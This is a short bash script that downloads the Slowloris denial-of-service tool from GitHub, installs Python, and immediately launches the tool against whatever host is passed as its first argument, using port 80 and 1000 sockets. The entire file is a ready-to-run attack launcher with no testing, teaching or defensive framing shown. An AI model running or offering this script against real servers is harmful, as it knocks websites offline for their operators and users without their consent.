#!/bin/bash

git clone https://github.com/gkbrk/slowloris
chmod +x slowloris/setup.py
chmod +x slowloris/slowloris.py
apt install -y python3
python3 slowloris/setup.py
python3 slowloris/slowloris.py "$1" -p 80 -s 1000